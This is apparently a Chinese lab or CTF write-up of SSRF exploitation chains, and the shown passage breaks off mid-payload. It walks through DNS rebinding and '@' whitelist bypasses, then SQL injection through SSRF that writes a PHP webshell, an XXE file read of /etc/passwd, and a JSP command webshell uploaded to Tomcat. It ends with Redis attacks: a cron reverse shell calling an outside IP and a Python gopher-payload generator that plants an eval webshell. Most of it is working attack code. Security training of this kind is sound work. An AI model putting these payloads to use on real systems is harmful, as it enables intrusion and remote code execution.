+<h3 id="SSRF之DNS重绑定绕过"><a href="#SSRF之DNS重绑定绕过" class="headerlink" title="SSRF之DNS重绑定绕过"></a>SSRF之DNS重绑定绕过</h3><p>利用 DNS 解析的动态性和后端校验的时间差 —— 攻击者控制一个域名的 DNS 解析规则，让后端在<strong>校验阶段</strong>解析该域名得到合法公网 IP（通过私网 IP 过滤），而在<strong>实际请求阶段</strong>，因 DNS 缓存失效或服务器动态返回结果，该域名又解析为靶场的私网 &#x2F; 本地 IP，后端未对这一二次解析结果做校验，最终让原本被限制的私网地址访问请求成功执行，以此绕过后端基于 IP 或域名的严格过滤规则</p>
+<p>原理如图</p>
+<p><img src="/img/image-20251126150827848.png" srcset="/img/loading.gif" lazyload alt="image-20251126150827848"></p>
+<p>对此我们只需要利用一个网站配置DNS重绑定</p>
+<p><img src="/img/image-20251126150933105.png" srcset="/img/loading.gif" lazyload alt="image-20251126150933105"></p>
+<p>对此即可成功执行攻击</p>
+<p><img src="/img/image-20251126150510320.png" srcset="/img/loading.gif" lazyload alt="image-20251126150510320"></p>
+<h3 id="SSRF之白名单绕过"><a href="#SSRF之白名单绕过" class="headerlink" title="SSRF之白名单绕过"></a>SSRF之白名单绕过</h3><p>如果场景要求url必须要有某些参数，则可以利用 <code>@</code> 符号</p>
+<p>URL 中 <code>@</code> 符号的作用是分隔 “用户认证信息” 和 “实际访问地址”，后端若仅校验字符串包含 <code>http://notfound.ctfhub.com</code>，而未解析 URL 结构，就会被绕过：</p>
+<ul>
+<li><strong>构造 payload</strong>：<code>http://notfound.ctfhub.com@127.0.0.1:80</code></li>
+<li><strong>原理</strong>：字符串中完整包含 <code>http://notfound.ctfhub.com</code>，满足格式要求；但 <code>curl</code> 等工具会忽略 <code>@</code> 前的内容，实际访问 <code>127.0.0.1:80</code>（本地私网地址）。</li>
+<li><strong>进阶</strong>：若需指定路径，可继续拼接：<code>http://notfound.ctfhub.com@127.0.0.1:80/shell.php</code></li>
+</ul>
+<h3 id="ssrf进行sql注入攻击并且getshell"><a href="#ssrf进行sql注入攻击并且getshell" class="headerlink" title="ssrf进行sql注入攻击并且getshell"></a>ssrf进行sql注入攻击并且getshell</h3><p>注意：需要进行url编码不然无法被解析</p>
+<h4 id="1、判断闭合方式"><a href="#1、判断闭合方式" class="headerlink" title="1、判断闭合方式"></a>1、判断闭合方式</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2、爆列数"><a href="#2、爆列数" class="headerlink" title="2、爆列数"></a>2、爆列数</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 测试3列（预期报错）</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br><br><span class="hljs-comment"># 测试4列（预期无报错）</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3、爆库名"><a href="#3、爆库名" class="headerlink" title="3、爆库名"></a>3、爆库名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="4、爆表名"><a href="#4、爆表名" class="headerlink" title="4、爆表名"></a>4、爆表名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>table_name%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=database()%<span class="hljs-number">20</span>limit%<span class="hljs-number">200</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="5、爆字段名"><a href="#5、爆字段名" class="headerlink" title="5、爆字段名"></a>5、爆字段名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>column_name%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>information_schema.columns%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=database()%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>table_name=&#x27;flag_is_here&#x27;%<span class="hljs-number">20</span>limit%<span class="hljs-number">200</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="6、读取flag"><a href="#6、读取flag" class="headerlink" title="6、读取flag"></a>6、读取flag</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>content%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>flag_is_here%<span class="hljs-number">20</span>limit%<span class="hljs-number">200</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="7、拿shell"><a href="#7、拿shell" class="headerlink" title="7、拿shell"></a><img src="/img/image-20251126215531631.png" srcset="/img/loading.gif" lazyload alt="image-20251126215531631">7、拿shell</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.72.23.23</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>and%<span class="hljs-number">201</span>=<span class="hljs-number">0</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">20</span>NULL,NULL,NULL,&#x27;%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span>passthru($_GET[%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>]);?%<span class="hljs-number">3</span>E&#x27;%<span class="hljs-number">20</span>into%<span class="hljs-number">20</span>dumpfile%<span class="hljs-number">20</span>&#x27;/var/www/html/shell_pure.php&#x27;%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20251126220510840.png" srcset="/img/loading.gif" lazyload alt="image-20251126220510840"></p>
+<h3 id="SSRF打XXE漏洞"><a href="#SSRF打XXE漏洞" class="headerlink" title="SSRF打XXE漏洞"></a>SSRF打XXE漏洞</h3><p>查看页面源代码明显是一个XXE漏洞</p>
+<p><img src="/img/image-20251127145833155.png" srcset="/img/loading.gif" lazyload alt="image-20251127145833155"></p>
+<p>构造playload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.25<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>112<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>放到bp对playload进行二次编码</p>
+<p><img src="/img/image-20251127145934716.png" srcset="/img/loading.gif" lazyload alt="image-20251127145934716"></p>
+<p>最后发包即可利用</p>
+<h3 id="ssrf利用tomcat任意文件写入"><a href="#ssrf利用tomcat任意文件写入" class="headerlink" title="ssrf利用tomcat任意文件写入"></a>ssrf利用tomcat任意文件写入</h3><p>编写playload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/1.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.26:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">UserAgent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-gradle">&lt;%</span><br><span class="language-gradle">    String command = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);</span><br><span class="language-gradle">    <span class="hljs-keyword">if</span>(command != <span class="hljs-keyword">null</span>)</span><br><span class="language-gradle">    &#123;</span><br><span class="language-gradle">        java.io.InputStream in=<span class="hljs-keyword">Runtime</span>.getRuntime().exec(command).getInputStream();</span><br><span class="language-gradle">        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;</span><br><span class="language-gradle">        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];</span><br><span class="language-gradle">        out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="language-gradle">        <span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)</span><br><span class="language-gradle">        &#123;</span><br><span class="language-gradle">            out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));</span><br><span class="language-gradle">        &#125;</span><br><span class="language-gradle">        out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="language-gradle">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-gradle">        out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="language-gradle">    &#125;</span><br><span class="language-gradle">%&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用gopher伪协议向内网发送PUT请求</p>
+<p><img src="/img/image-20251202151000164.png" srcset="/img/loading.gif" lazyload alt="image-20251202151000164"></p>
+<p>观察到201则成功完成文件上传</p>
+<p>随后对上传的木马进行利用</p>
+<p><img src="/img/image-20251202151141465.png" srcset="/img/loading.gif" lazyload alt="image-20251202151141465"></p>
+<h3 id="Redis-未授权RCE"><a href="#Redis-未授权RCE" class="headerlink" title="Redis 未授权RCE"></a>Redis 未授权RCE</h3><p>Redis 是内存数据库，但允许把内存内容持久化到磁盘。如果没有认证 → 任何人都能远程执行 “写系统文件”。</p>
+<p>系统没有web服务，也没有SSH公钥私钥认证，那就用定时任务实现远程代码执行</p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>dict:&#x2F;&#x2F; 协议命令</th>
+<th>动作说明（从原理角度）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>dict://172.72.23.27:6379/FLUSHALL</code></td>
+<td>清空 Redis 内存数据，避免已有键值影响持久化过程</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>dict://172.72.23.27:6379/SET x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/47.96.99.165/2333 0&gt;&amp;1\n&quot;</code></td>
+<td>写入带首尾换行的文本内容，使其在落盘时能被系统按行解析</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>dict://172.72.23.27:6379/CONFIG SET dir /var/spool/cron/</code></td>
+<td>修改 Redis 持久化目录，将持久化文件保存到 Linux 定时任务目录</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>dict://172.72.23.27:6379/CONFIG SET dbfilename root</code></td>
+<td>设置持久化文件名为 <code>root</code>，对应 cron 用户任务文件路径 <code>/var/spool/cron/root</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>dict://172.72.23.27:6379/SAVE</code></td>
+<td>触发 RDB 持久化，Redis 将内存写入上述路径文件，文件内容由系统解析</td>
+</tr>
+</tbody></table>
+<p><img src="/img/image-20251202222921787.png" srcset="/img/loading.gif" lazyload alt="image-20251202222921787"></p>
+<p>最后成功反弹到监听的的端口</p>
+<p><img src="/img/image-20251202222946469.png" srcset="/img/loading.gif" lazyload alt="image-20251202222946469"></p>
+<h3 id="redis未授权webshell写入（无法使用dict场景"><a href="#redis未授权webshell写入（无法使用dict场景" class="headerlink" title="redis未授权webshell写入（无法使用dict场景)"></a>redis未授权webshell写入（无法使用dict场景)</h3><p>对于172..150.23.28发现需要密码认证</p>
+<p><img src="/img/image-20251203142553468.png" srcset="/img/loading.gif" lazyload alt="image-20251203142553468"></p>
+<p>发现其80端口存在web服务，是文件包含漏洞</p>
+<p><img src="/img/image-20251203142808927.png" srcset="/img/loading.gif" lazyload alt="image-20251203142808927"></p>
+<p>读取&#x2F;etc&#x2F;redis.conf,读取到密码P@ssw0rd</p>
+<p><img src="/img/image-20251203144304223.png" srcset="/img/loading.gif" lazyload alt="image-20251203144304223"></p>
+<p>验证一下发现验证通过</p>
+<p><img src="/img/image-20251203144404750.png" srcset="/img/loading.gif" lazyload alt="image-20251203144404750"></p>
+<p>但是没啥用，dict不支持多行命令，无法跟前面那样执行命令，只能打gopher伪协议带redis数据包</p>
+<p>这里有两种方法一种是</p>
+<h4 id="直接用脚本构造"><a href="#直接用脚本构造" class="headerlink" title="直接用脚本构造"></a>直接用脚本构造</h4><p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>protocol = <span class="hljs-string">&quot;gopher://&quot;</span><br>ip = <span class="hljs-string">&quot;172.150.23.28&quot;</span><br>port = <span class="hljs-string">&quot;6379&quot;</span><br>shell = <span class="hljs-string">&quot;\n\n&lt;?php eval($_GET[1]);?&gt;\n\n&quot;</span><br>filename = <span class="hljs-string">&quot;mo60.php&quot;</span><br>path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd = <span class="hljs-string">&quot;P@ssw0rd&quot;</span><br>cmd = [<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),  <br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span>,<br>     <span class="hljs-string">&quot;quit&quot;</span><br>    ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload = protocol + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF = <span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.quote(redis_format(x))<br><br>    <span class="hljs-comment"># print(payload)</span><br>    <span class="hljs-built_in">print</span>(urllib.parse.quote(payload))<br> <br><br></code></pre></td></tr></table></figure>
+
+<p>执行后得到</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>%<span class="hljs-number">3</span>A//<span class="hljs-number">172.150.23.28</span>%<span class="hljs-number">3</span>A6379/_%<span class="hljs-number">252</span>A2%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AAUTH%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AP%<span class="hljs-number">2540</span>ssw0rd%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aflushall%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A3%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25241</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252427</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">253</span>C%<span class="hljs-number">253</span>Fphp%<span class="hljs-number">2520</span>eval%<span class="hljs-number">2528</span>%<span class="hljs-number">2524</span>_GET%<span class="hljs-number">255</span>B1%<span class="hljs-number">255</span>D%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">253</span>F%<span class="hljs-number">253</span>E%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252413</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A/var/www/html%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Amo60.php%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aquit%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure>
+
+<p>发包利用成功</p>
+<p><img src="/img/image-20251203155306472.png" srcset="/img/loading.gif" lazyload alt="image-20251203155306472"></p>
+<p>实现任意命令执行</p>
+<p><img src="/img/image-20251203155327932.png" srcset="/img/loading.gif" lazyload alt="image-20251203155327932"></p>
+<h4 id="还有一种是手动构造数据包"><a href="#还有一种是手动构造数据包" class="headerlink" title="还有一种是手动构造数据包"></a>还有一种是手动构造数据包</h4><p>在本地模拟内网redis环境，首先在一端开启redis服务，并将6379转发到</p>
+<p>5301端口</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">socat -v tcp-<span class="hljs-keyword">listen</span>:<span class="hljs-number">5301</span>,<span class="hljs-keyword">fork</span> tcp-<span class="hljs-keyword">connect</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20251203163735606.png" srcset="/img/loading.gif" lazyload alt="image-20251203163735606"></p>
+<p>在同时另一端登录5201，并执行操作</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">5201</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20251203163745116.png" srcset="/img/loading.gif" lazyload alt="image-20251203163745116"></p>
+<p>最后整理出redis数据包</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*<span class="hljs-number">2</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>auth<span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>P@ssw0rd<span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>flushall<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>dir<span class="hljs-string">\r</span><br>$<span class="hljs-number">13</span><span class="hljs-string">\r</span><br>/<span class="hljs-keyword">var</span>/www/html<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">10</span><span class="hljs-string">\r</span><br>dbfilename<span class="hljs-string">\r</span><br>$<span class="hljs-number">9</span><span class="hljs-string">\r</span><br>shell.php<span class="hljs-string">\r</span><br>*<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>x<span class="hljs-string">\r</span><br>$<span class="hljs-number">25</span><span class="hljs-string">\r</span><br> <br> <br>&lt;?php <span class="hljs-built_in">eval</span>($_GET[<span 